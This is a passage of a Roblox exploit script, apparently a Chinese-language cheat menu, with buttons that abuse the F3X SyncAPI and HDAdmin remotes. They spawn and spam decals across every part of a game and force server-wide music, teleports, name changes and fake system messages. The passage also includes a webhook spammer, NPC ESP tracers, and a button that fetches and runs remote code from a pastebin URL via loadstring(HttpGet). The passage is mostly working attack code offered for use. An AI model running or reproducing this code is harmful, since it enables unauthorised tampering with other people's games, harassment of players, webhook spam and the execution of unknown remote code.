            local args = {"SyncMove",{{Part=part,CFrame=cf}}}
            _(args)
        end
        local function Resize(part,size,cf)
            local args = {"SyncResize",{{Part=part,CFrame=cf,Size=size}}}
            _(args)
        end
        local function AddMesh(part)
            local args = {"CreateMeshes",{{Part=part}}}
            _(args)
        end
        local function SetMesh(part,meshid)
            local args = {"SyncMesh",{{Part=part,MeshId="rbxassetid://"..meshid}}}
            _(args)
        end
        local function SetTexture(part, texid)
            local args = {"SyncMesh",{{Part=part,TextureId="rbxassetid://"..texid}}}
            _(args)
        end
        local function SetName(part, stringg)
            local args = {"SetName",{part},stringg}
            _(args)
        end
        local function MeshResize(part,size)
            local args = {"SyncMesh",{{Part=part,Scale=size}}}
            _(args)
        end
        local function Weld(part1, part2,lead)
            local args = {"CreateWelds",{part1,part2},lead}
            _(args)
        end
        local function SetLocked(part,boolean)
            local args = {"SetLocked",{part},boolean}
            _(args)
        end
        local function SetTrans(part,int)
            local args = {"SyncMaterial",{{Part=part,Transparency=int}}}
            _(args)
        end
        local function CreateSpotlight(part)
            local args = {"CreateLights",{{Part=part,LightType="SpotLight"}}}
            _(args)
        end
        local function SyncLighting(part,brightness)
            local args = {"SyncLighting",{{Part=part,LightType="SpotLight",Brightness=brightness}}}
            _(args)
        end
        local function Color(part,color)
            local args = {"SyncColor",{{Part=part,Color=color,UnionColoring=false}}}
            _(args)
        end
        local function SpawnDecal(part,side)
            local args = {"CreateTextures",{{Part=part,Face=side,TextureType="Decal"}}}
            _(args)
        end
        local function AddDecal(part,asset,side)
            local args = {"SyncTexture",{{Part=part,Face=side,TextureType="Decal",Texture="rbxassetid://".. asset}}}
            _(args)
        end

        local e = char.HumanoidRootPart.CFrame.X
        local f = char.HumanoidRootPart.CFrame.Y
        local g = char.HumanoidRootPart.CFrame.Z
        local spawnPos = CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0, 6, 0)

        CreatePart(spawnPos, workspace)
        task.wait(0.2)

        local skyPart
        for _, v in workspace:GetDescendants() do
            if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 1 then
                skyPart = v
                SetName(v, "RandomSpinSky")
                AddMesh(v)
                SetMesh(v, "111891702759441")
                SetTexture(v, skyTexId)
                MeshResize(v, Vector3.new(2500, 2500, 2500))
                SetLocked(v, true)
                SetAnchor(true, v)
                SetCollision(v, false)
                break
            end
        end

        if skyPart then
            local t = 0
            local baseSpeed = 14
            local randomness = 14
            game:GetService("RunService").Heartbeat:Connect(function(dt)
                t = t + dt
                local rotX = math.sin(t * 1.5) * randomness
                local rotY = t * baseSpeed
                local rotZ = math.cos(t * 2.1) * randomness
                local newCf = spawnPos * CFrame.Angles(
                    math.rad(rotX),
                    math.rad(rotY),
                    math.rad(rotZ)
                )
                MovePart(skyPart, newCf)
            end)
        end
    end
})

getgenv().F3X_SpamDecal = "135461405245048"

Tabs.F3xTab:Section({Title = "F3X‑全图贴贴图"})

Tabs.F3xTab:Input({
    Title = "贴图资产ID",
    Value = getgenv().F3X_SpamDecal,
    Placeholder = "只填写数字ID",
    Callback = function(text)
        local str = text:gsub("%s","")
        getgenv().F3X_SpamDecal = str
    end
})

Tabs.F3xTab:Button({
    Title = "贴图",
    Callback = function()
        local spamDecalId = getgenv().F3X_SpamDecal
        local player = game.Players.LocalPlayer
        local char = player.Character
        local tool

        for _,v in player:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        for _,v in game.ReplicatedStorage:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end

        if not tool or not tool:FindFirstChild("SyncAPI") or not tool.SyncAPI:FindFirstChild("ServerEndpoint") then
            return
        end
        local remote = tool.SyncAPI.ServerEndpoint

        local function _(args)
            remote:InvokeServer(unpack(args))
        end
        local function SetLocked(part,boolean)
            local args = {{"SetLocked",{part},boolean}}
            _(args)
        end
        local function SpawnDecal(part,side)
            local args = {"CreateTextures",{{Part=part,Face=side,TextureType="Decal"}}}
            _(args)
        end
        local function AddDecal(part,asset,side)
            local args = {"SyncTexture",{{Part=part,Face=side,TextureType="Decal",Texture="rbxassetid://".. asset}}}
            _(args)
        end

        local function spam(id)
            for _,v in game.workspace:GetDescendants() do
                if v:IsA("BasePart") then
                    task.spawn(function()
                        SetLocked(v,false)
                        SpawnDecal(v,Enum.NormalId.Front)
                        AddDecal(v,id,Enum.NormalId.Front)
                        SpawnDecal(v,Enum.NormalId.Back)
                        AddDecal(v,id,Enum.NormalId.Back)
                        SpawnDecal(v,Enum.NormalId.Right)
                        AddDecal(v,id,Enum.NormalId.Right)
                        SpawnDecal(v,Enum.NormalId.Left)
                        AddDecal(v,id,Enum.NormalId.Left)
                        SpawnDecal(v,Enum.NormalId.Bottom)
                        AddDecal(v,id,Enum.NormalId.Bottom)
                        SpawnDecal(v,Enum.NormalId.Top)
                        AddDecal(v,id,Enum.NormalId.Top)
                    end)
                end
            end
        end

        spam(spamDecalId)
    end
})

getgenv().F3X_Particle_Decal1 = "135461405245048"
getgenv().F3X_Particle_Decal2 = "135461405245048"
getgenv().F3X_Particle_Decal3 = "135461405245048"

Tabs.F3xTab:Section({Title = "F3X‑随机粒子"})

Tabs.F3xTab:Input({
    Title = "贴图ID‑1",
    Value = getgenv().F3X_Particle_Decal1,
    Placeholder = "只填数字",
    Callback = function(text)
        local str = text:gsub("%s","")
        getgenv().F3X_Particle_Decal1 = str
    end
})
Tabs.F3xTab:Input({
    Title = "贴图ID‑2",
    Value = getgenv().F3X_Particle_Decal2,
    Placeholder = "只填数字",
    Callback = function(text)
        local str = text:gsub("%s","")
        getgenv().F3X_Particle_Decal2 = str
    end
})
Tabs.F3xTab:Input({
    Title = "贴图ID‑3",
    Value = getgenv().F3X_Particle_Decal3,
    Placeholder = "只填数字",
    Callback = function(text)
        local str = text:gsub("%s","")
        getgenv().F3X_Particle_Decal3 = str
    end
})

Tabs.F3xTab:Button({
    Title = "启动粒子",
    Callback = function()
        local decal1 = getgenv().F3X_Particle_Decal1
        local decal2 = getgenv().F3X_Particle_Decal2
        local decal3 = getgenv().F3X_Particle_Decal3

        local player = game.Players.LocalPlayer
        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end

        local tool
        for _,v in player:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        for _,v in game.ReplicatedStorage:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        if not tool or not tool:FindFirstChild("SyncAPI") or not tool.SyncAPI:FindFirstChild("ServerEndpoint") then
            return
        end
        local remote = tool.SyncAPI.ServerEndpoint

        local function _(args)
            remote:InvokeServer(unpack(args))
        end
        local function SetCollision(part,boolean)
            local args = {{"SyncCollision",{{Part=part,CanCollide=boolean}}}}
            _(args)
        end
        local function SetAnchor(boolean,part)
            local args = {{"SyncAnchor",{{Part=part,Anchored=boolean}}}}
            _(args)
        end
        local function CreatePart(cf,parent)
            local args = {"CreatePart","Normal",cf,parent}
            _(args)
        end
        local function DestroyPart(part)
            local args = {"Remove",{part}}
            _(args)
        end
        local function MovePart(part,cf)
            local args = {"SyncMove",{{Part=part,CFrame=cf}}}
            _(args)
        end
        local function Resize(part,size,cf)
            local args = {"SyncResize",{{Part=part,CFrame=cf,Size=size}}}
            _(args)
        end
        local function AddMesh(part)
            local args = {"CreateMeshes",{{Part=part}}}
            _(args)
        end
        local function SetMesh(part,meshid)
            local args = {"SyncMesh",{{Part=part,MeshId="rbxassetid://"..meshid}}}
            _(args)
        end
        local function SetTexture(part, texid)
            local args = {"SyncMesh",{{Part=part,TextureId="rbxassetid://"..texid}}}
            _(args)
        end
        local function SetName(part, stringg)
            local args = {"SetName",{part},stringg}
            _(args)
        end
        local function MeshResize(part,size)
            local args = {"SyncMesh",{{Part=part,Scale=size}}}
            _(args)
        end
        local function Weld(part1, part2,lead)
            local args = {"CreateWelds",{part1,part2},lead}
            _(args)
        end
        local function SetLocked(part,boolean)
            local args = {"SetLocked",{part},boolean}
            _(args)
        end
        local function SetTrans(part,int)
            local args = {"SyncMaterial",{{Part=part,Transparency=int}}}
            _(args)
        end
        local function CreateSpotlight(part)
            local args = {"CreateLights",{{Part=part,LightType="SpotLight"}}}
            _(args)
        end
        local function SyncLighting(part,brightness)
            local args = {"SyncLighting",{{Part=part,LightType="SpotLight",Brightness=brightness}}}
            _(args)
        end
        local function Color(part,color)
            local args = {"SyncColor",{{Part=part,Color=color,UnionColoring=false}}}
            _(args)
        end
        local function SpawnDecal(part,side)
            local args = {"CreateTextures",{{Part=part,Face=side,TextureType="Decal"}}}
            _(args)
        end
        local function AddDecal(part,asset,side)
            local args = {"SyncTexture",{{Part=part,Face=side,TextureType="Decal",Texture="rbxassetid://".. asset}}}
            _(args)
        end

        local ids = {decal1, decal2, decal3}

        task.spawn(function()
            while task.wait(0.1) do
                local e = char.HumanoidRootPart.CFrame.X + math.random(-100, 100)
                local f = char.HumanoidRootPart.CFrame.Y
                local g = char.HumanoidRootPart.CFrame.Z + math.random(-100, 100)
                CreatePart(CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0,6,0), workspace)

                for _,v in game.Workspace:GetDescendants() do
                    if v:IsA("BasePart") and v.CFrame.X == math.floor(e) and v.CFrame.Z == math.floor(g) then
                        SetName(v,"particle by expl_0itspooky")
                        local id = ids[math.random(1, #ids)]
                        SpawnDecal(v,Enum.NormalId.Front)
                        AddDecal(v,id,Enum.NormalId.Front)
                        SpawnDecal(v,Enum.NormalId.Back)
                        AddDecal(v,id,Enum.NormalId.Back)
                        SetTrans(v,1)
                        Resize(v,Vector3.new(7,7,0.1),v.CFrame)
                        SetLocked(v,true)

                        task.spawn(function()
                            while task.wait(0.01) do
                                MovePart(v,CFrame.new(v.CFrame.X,v.CFrame.Y + 1,v.CFrame.Z))
                            end
                        end)
                        break
                    end
                end
            end
        end)
    end
})

getgenv().HD_MusicId = "1842652230"
getgenv().HD_Pitch = "0.45"
getgenv().HD_Volume = "inf"

Tabs.F3xTab:Section({Title = "HDAdmin音乐指令"})

Tabs.F3xTab:Input({
    Title = "音乐ID",
    Value = getgenv().HD_MusicId,
    Placeholder = "填音乐数字ID",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().HD_MusicId = s
    end
})

Tabs.F3xTab:Input({
    Title = "音调pitch",
    Value = getgenv().HD_Pitch,
    Placeholder = "0‑2之间",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().HD_Pitch = s
    end
})

Tabs.F3xTab:Input({
    Title = "音量volume",
    Value = getgenv().HD_Volume,
    Placeholder = "数字 / inf",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().HD_Volume = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行播放音乐指令",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

        RequestCommand:InvokeServer(";music "..getgenv().HD_MusicId)
        RequestCommand:InvokeServer(";pitch "..getgenv().HD_Pitch)
        RequestCommand:InvokeServer(";volume "..getgenv().HD_Volume)
    end
})

getgenv().HD_GlobalPlaceId = "10086"

Tabs.F3xTab:Section({Title = "HDAdmin 传送游戏"})

Tabs.F3xTab:Input({
    Title = "目标PlaceId",
    Value = getgenv().HD_GlobalPlaceId,
    Placeholder = "填写游戏ID数字",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().HD_GlobalPlaceId = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行globalforceplace",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";globalforceplace "..getgenv().HD_GlobalPlaceId)
    end
})

getgenv().HD_ServerMsg = "LY Team"

Tabs.F3xTab:Section({Title = "HDAdmin 服务器公告"})

Tabs.F3xTab:Input({
    Title = "公告文本",
    Value = getgenv().HD_ServerMsg,
    Placeholder = "输入要发送的公告内容",
    Callback = function(text)
        local s = text
        getgenv().HD_ServerMsg = s
    end
})

Tabs.F3xTab:Button({
    Title = "发送serverMessage公告",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";serverMessage "..getgenv().HD_ServerMsg)
    end
})

getgenv().HD_CreateTeam_Color = "red"
getgenv().HD_CreateTeam_Name = "LY Team"

Tabs.F3xTab:Section({Title = "HDAdmin 创建队伍"})

Tabs.F3xTab:Input({
    Title = "队伍颜色",
    Value = getgenv().HD_CreateTeam_Color,
    Placeholder = "red / blue / green",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().HD_CreateTeam_Color = s
    end
})

Tabs.F3xTab:Input({
    Title = "队伍名称",
    Value = getgenv().HD_CreateTeam_Name,
    Placeholder = "输入队伍名字",
    Callback = function(text)
        local s = text
        getgenv().HD_CreateTeam_Name = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行 createteam",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";createteam "..getgenv().HD_CreateTeam_Color.." "..getgenv().HD_CreateTeam_Name)
    end
})

getgenv().HD_ChatOthers_Msg = "LY Team was here"

Tabs.F3xTab:Section({Title = "HDAdmin 所有人发言"})

Tabs.F3xTab:Input({
    Title = "发送聊天内容",
    Value = getgenv().HD_ChatOthers_Msg,
    Placeholder = "填写聊天文字",
    Callback = function(text)
        local s = text
        getgenv().HD_ChatOthers_Msg = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行 ;chat others",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";chat all "..getgenv().HD_ChatOthers_Msg)
    end
})

getgenv().HD_SystemMsg = "LOL"

Tabs.F3xTab:Section({Title = "HDAdmin systemmessage系统消息"})

Tabs.F3xTab:Input({
    Title = "系统消息文本",
    Value = getgenv().HD_SystemMsg,
    Placeholder = "填写systemmessage内容",
    Callback = function(text)
        local s = text
        getgenv().HD_SystemMsg = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行指令",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommand:InvokeServer(";systemmessage "..getgenv().HD_SystemMsg)
    end
})

getgenv().HD_NameAll = "sz"

Tabs.F3xTab:Section({Title = "HDAdmin 修改全体玩家名字"})

Tabs.F3xTab:Input({
    Title = "设置的名字",
    Value = getgenv().HD_NameAll,
    Placeholder = "填写要改成的名字",
    Callback = function(text)
        local s = text
        getgenv().HD_NameAll = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";name all "..getgenv().HD_NameAll)
    end
})

getgenv().HD_NoticeAll_Msg = "鹿言 was here!1"
getgenv().HD_Sh_Msg = "sz hacker game "

Tabs.F3xTab:Section({Title = "HDAdmin notice & sh弹窗"})

Tabs.F3xTab:Input({
    Title = "notice‑all公告弹窗",
    Value = getgenv().HD_NoticeAll_Msg,
    Placeholder = "notice all 消息内容",
    Callback = function(text)
        local s = text
        getgenv().HD_NoticeAll_Msg = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行公告",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";notice all "..getgenv().HD_NoticeAll_Msg)
    end
})

Tabs.F3xTab:Input({
    Title = "sh静默弹窗消息",
    Value = getgenv().HD_Sh_Msg,
    Placeholder = "sh 弹窗文字",
    Callback = function(text)
        local s = text
        getgenv().HD_Sh_Msg = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行hint",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        RequestCommandSilent:InvokeServer(";sh "..getgenv().HD_Sh_Msg)
    end
})

getgenv().HD_TitlerAll = "Goddddd"

Tabs.F3xTab:Section({Title = "HDAdmin titler全服标题"})

Tabs.F3xTab:Input({
    Title = "全服titler标题文字",
    Value = getgenv().HD_TitlerAll,
    Placeholder = "填写标题显示文本",
    Callback = function(text)
        local s = text
        getgenv().HD_TitlerAll = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行 ;titler all",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";titler all "..getgenv().HD_TitlerAll)
    end
})

Tabs.F3xTab:Button({
	Title = "下起了奥巴马",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/4RVkHQQi"))()
	end 
})

getgenv().SyncAPI_KrabTexId = "135461405245048"

Tabs.F3xTab:Section({Title = "SyncAPI‑KrustyKrab生成"})

Tabs.F3xTab:Input({
    Title = "贴图TextureId",
    Value = getgenv().SyncAPI_KrabTexId,
    Placeholder = "只填数字assetid",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().SyncAPI_KrabTexId = s
    end
})

Tabs.F3xTab:Button({
    Title = "生成KrustyKrab",
    Callback = function()
        local player = game.Players.LocalPlayer
        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end

        local tool
        for _,v in player:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        for _,v in game.ReplicatedStorage:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        if not tool or not tool:FindFirstChild("ServerEndpoint") then return end
        local remote = tool.ServerEndpoint

        local function _(args)
            remote:InvokeServer(unpack(args))
        end

        local function SetCollision(part,boolean)
            local args = {
                [1] = "SyncCollision",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["CanCollide"] = boolean
                    }
                }
            }
            _(args)
        end
        local function SetAnchor(boolean,part)
            local args = {
                [1] = "SyncAnchor",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["Anchored"] = boolean
                    }
                }
            }
            _(args)
        end
        local function CreatePart(cf,parent)
            local args = {
                [1] = "CreatePart",
                [2] = "Normal",
                [3] = cf,
                [4] = parent
            }
            _(args)
        end
        local function MovePart(part,cf)
            local args = {
                [1] = "SyncMove",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["CFrame"] = cf
                    }
                }
            }
            _(args)
        end
        local function Resize(part,size,cf)
            local args = {
                [1] = "SyncResize",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["CFrame"] = cf,
                        ["Size"] = size
                    }
                }
            }
            _(args)
        end
        local function AddMesh(part)
            local args = {
                [1] = "CreateMeshes",
                [2] = {
                    [1] = {
                        ["Part"] = part
                    }
                }
            }
            _(args)
        end
        local function SetMesh(part,meshid)
            local args = {
                [1] = "SyncMesh",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["MeshId"] = "rbxassetid://"..meshid
                    }
                }
            }
            _(args)
        end
        local function SetTexture(part, texid)
            local args = {
                [1] = "SyncMesh",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["TextureId"] = "rbxassetid://"..texid
                    }
                }
            }
            _(args)
        end
        local function SetName(part, stringg)
            local args = {
                [1] = "SetName",
                [2] = {
                    [1] = part
                },
                [3] = stringg
            }
            _(args)
        end
        local function MeshResize(part,size)
            local args = {
                [1] = "SyncMesh",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["Scale"] = size
                    }
                }
            }
            _(args)
        end
        local function Weld(part1, part2,lead)
            local args = {
                [1] = "CreateWelds",
                [2] = {
                    [1] = part1,
                    [2] = part2
                },
                [3] = lead
            }
            _(args)
        end
        local function SetLocked(part,boolean)
            local args = {
                [1] = "SetLocked",
                [2] = {
                    [1] = part
                },
                [3] = boolean
            }
            _(args)
        end
        local function SetTrans(part,int)
            local args = {
                [1] = "SyncMaterial",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["Transparency"] = int
                    }
                }
            }
            _(args)
        end
        local function CreateSpotlight(part)
            local args = {
                [1] = "CreateLights",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["LightType"] = "SpotLight"
                    }
                }
            }
            _(args)
        end
        local function SyncLighting(part,brightness)
            local args = {
                [1] = "SyncLighting",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["LightType"] = "SpotLight",
                        ["Brightness"] = brightness
                    }
                }
            }
            _(args)
        end
        local function Color(part,color)
            local args = {
                [1] = "SyncColor",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["Color"] = color,
                        ["UnionColoring"] = false
                    }
                }
            }
            _(args)
        end
        local function SpawnDecal(part,side)
            local args = {
                [1] = "CreateTextures",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["Face"] = side,
                        ["TextureType"] = "Decal"
                    }
                }
            }
            _(args)
        end
        local function AddDecal(part,asset,side)
            local args = {
                [1] = "SyncTexture",
                [2] = {
                    [1] = {
                        ["Part"] = part,
                        ["Face"] = side,
                        ["TextureType"] = "Decal",
                        ["Texture"] = "rbxassetid://".. asset
                    }
                }
            }
            _(args)
        end

        local function Krab(id)
            local e = char.HumanoidRootPart.CFrame.x
            local f = char.HumanoidRootPart.CFrame.y
            local g = char.HumanoidRootPart.CFrame.z
            CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,18,0),workspace)
            for _,v in game.Workspace:GetDescendants() do
                if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
                    SetName(v,"Blue2spookys Krusty Krab")
                    AddMesh(v)
                    SetMesh(v,"1347582902")
                    SetTexture(v,id)
                    MeshResize(v,Vector3.new(0.2,0.2,0.2))
                    SetLocked(v,true)
                end
            end
        end

        Krab(getgenv().SyncAPI_KrabTexId)
    end
})

getgenv().HD_CharAll_Target = "godwhy532"

Tabs.F3xTab:Section({Title = "HDAdmin char‑all"})

Tabs.F3xTab:Input({
    Title = "角色用户名",
    Value = getgenv().HD_CharAll_Target,
    Placeholder = "填写Roblox用户名",
    Callback = function(text)
        local s = text:gsub("%s","")
        getgenv().HD_CharAll_Target = s
    end
})

Tabs.F3xTab:Button({
    Title = "执行 ;char all",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand
        RequestCommand:InvokeServer(";char all "..getgenv().HD_CharAll_Target)
    end
})

Tabs.WebhookTab:Input({
    Title = "Webhook链接",
    Placeholder = "粘贴webhook地址",    
    Callback = function(text)
        Window.ConfigManager:Set("webhookLink", text)
    end
})

Tabs.WebhookTab:Input({
    Title = "thread_name 帖子名称",
    Placeholder = "论坛频道帖子名",    
    Callback = function(text)
        Window.ConfigManager:Set("threadName", text)
    end
})

Tabs.WebhookTab:Divider()

Tabs.WebhookTab:Input({
    Title = "Embed标题",    
    Callback = function(text)
        Window.ConfigManager:Set("embedTitle", text)
    end
})

Tabs.WebhookTab:Input({
    Title = "Embed描述",    
    Callback = function(text)
        Window.ConfigManager:Set("embedDesc", text)
    end
})

Tabs.WebhookTab:Divider()

Tabs.WebhookTab:Input({
    Title = "发送次数",
    Placeholder = "输入数字",    
    Callback = function(text)
        local num = tonumber(text)
        if num then
            Window.ConfigManager:Set("sendTimes", math.floor(num))
        end
    end
})

Tabs.WebhookTab:Input({
    Title = "间隔速度(毫秒)",
    Placeholder = "输入数字",    
    Callback = function(text)
        local num = tonumber(text)
        if num then
            Window.ConfigManager:Set("delayMs", math.floor(num))
        end
    end
})

Tabs.WebhookTab:Divider()

Tabs.WebhookTab:Button({
    Title = "▶ 开始发送",
    Callback = function()
        local HttpService = game:GetService("HttpService")
        local Config = Window.ConfigManager

        if running then
            Window:Notification({Title="提示",Content="任务正在运行",Duration=2})
            return
        end

        local webhookLink = Config:Get("webhookLink","")
        local threadName = Config:Get("threadName","手机Python推送")
        local embedTitle = Config:Get("embedTitle","手机Python推送通知")
        local embedDesc = Config:Get("embedDesc","消息发送测试完成")
        local sendTimes = tonumber(Config:Get("sendTimes",1)) or 1
        local delayMs = tonumber(Config:Get("delayMs",1000)) or 1000

        if webhookLink == "" then
            Window:Notification({Title="错误",Content="Webhook链接不能为空",Duration=3})
            return
        end

        running = true
        Window:Notification({Title="Webhook",Content="任务已启动",Duration=2})

        task.spawn(function()
            for _ = 1, sendTimes do
                if not running then break end
                local payload = {
                    thread_name = threadName,
                    embeds = {
                        {
                            title = embedTitle,
                            description = embedDesc,
                            color = 0x00cc66
                        }
                    }
                }
                local ok, err = pcall(function()
                    local jsonStr = HttpService:JSONEncode(payload)
                    return HttpService:PostAsync(webhookLink, jsonStr)
                end)
                if not ok then
                    Window:Notification({Title="发送失败",Content=tostring(err),Duration=3})
                end
                task.wait(delayMs / 1000)
            end
            running = false
            Window:Notification({Title="Webhook",Content="发送任务结束",Duration=2})
        end)
    end
})

Tabs.WebhookTab:Button({
    Title = "■ 停止发送",
    Callback = function()
        running = false
        Window:Notification({Title="Webhook",Content="已中止任务",Duration=2})
    end
})

Tabs.WebhookTab:Button({
    Title = "💾保存配置",
    Callback = function()
        Window.ConfigManager:Save()
        Window:Notification({Title="配置",Content="已保存",Duration=2})
    end
})

Tabs.NpcEspTab:Colorpicker({
Title = "轮廓颜色",
Default = Color3.new(0,0.7,1),
Callback = function(color)
_G.outlineColor = color
end
})
Tabs.NpcEspTab:Toggle({
Title = "彩虹轮廓模式",
Default = false,
Callback = function(state)
_G.rainbowOutline = state
end
})
Tabs.NpcEspTab:Input({
Title = "轮廓透明度",
Default = "0",
Callback = function(val)
local num = tonumber(val)
if num then
_G.outlineTrans = math.clamp(num,0,1)
end
end
})
Tabs.NpcEspTab:Toggle({
Title = "NPC轮廓Highlight",
Default = false,
Callback = function(state)
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local conn
local highlightTable = {}
local function removeAllHighlights()
for _,hl in highlightTable do
if hl then hl:Destroy() end
end
table.clear(highlightTable)
end
local function addHighlight(model,col,trans)
if highlightTable[model] then return end
local hum = model:FindFirstChildOfClass("Humanoid")
local root = model:FindFirstChild("HumanoidRootPart")
if not hum or not root then return end
if model == LocalPlayer.Character then return end
local hl = Instance.new("Highlight")
hl.Parent = model
hl.Adornee = model
hl.FillTransparency = 1
hl.OutlineTransparency = trans
hl.OutlineColor = col
hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
table.insert(highlightTable,hl)
end
if state then
if not _G.outlineColor then _G.outlineColor = Color3.new(0,0.7,1) end
if not _G.outlineTrans then _G.outlineTrans = 0 end
removeAllHighlights()
conn = RunService.Heartbeat:Connect(function()
removeAllHighlights()
local time = tick()
local outlineC
if _G.rainbowOutline then
outlineC = Color3.fromHSV((time*0.6)%1,1,1)
else
outlineC = _G.outlineColor
end
for _,obj in workspace:GetDescendants() do
if obj:IsA("Model") then
local hum = obj:FindFirstChildOfClass("Humanoid")
local root = obj:FindFirstChild("HumanoidRootPart")
if hum and root and obj~=LocalPlayer.Character then
addHighlight(obj,outlineC,_G.outlineTrans)
end
end
end
end)
else
if conn then conn:Disconnect() end
removeAllHighlights()
end
end
})
Tabs.NpcEspTab:Colorpicker({
Title = "追踪线颜色",
Default = Color3.new(1,0.4,0),
Callback = function(color)
_G.lineColor = color
end
})
Tabs.NpcEspTab:Toggle({
Title = "彩虹追踪线模式",
Default = false,
Callback = function(state)
_G.rainbowLine = state
end
})
Tabs.NpcEspTab:Input({
Title = "追踪线粗细",
Default = "2",
Callback = function(val)
local num = tonumber(val)
if num then
_G.lineThickness = math.clamp(num,1,8)
end
end
})
Tabs.NpcEspTab:Input({
Title = "追踪线透明度",
Default = "0",
Callback = function(val)
local num = tonumber(val)
if num then
_G.lineTrans = math.clamp(num,0,1)
end
end
})
Tabs.NpcEspTab:Toggle({
Title = "只显示可见NPC追踪线",
Default = true,
Callback = function(state)
_G.lineOnlyVisible = state
end
})
Tabs.NpcEspTab:Toggle({
Title = "2D追踪线",
Default = false,
Callback = function(state)
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local conn
local lineTable = {}
local function removeAllLines()
for _,line in lineTable do
if line then line:Destroy() end
end
table.clear(lineTable)
end
local function drawLine(root,col,thick,trans)
local gui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("EspLineGui") or Instance.new("ScreenGui")
gui.Name = "EspLineGui"
gui.Parent = LocalPlayer.PlayerGui
local line = Instance.new("Frame")
line.AnchorPoint = Vector2.new(0.5,0.5)
line.BackgroundColor3 = col
line.BorderSizePixel = 0
line.BackgroundTransparency = trans
line.ZIndex = 100
local screenPos,visible = Camera:WorldToViewportPoint(root.Position)
if _G.lineOnlyVisible and not visible then return end
local viewportSize = Camera.ViewportSize
local startPoint = Vector2.new(viewportSize.X/2, viewportSize.Y)
local endPoint = Vector2.new(screenPos.X, screenPos.Y)
local delta = endPoint - startPoint
local length = delta.Magnitude
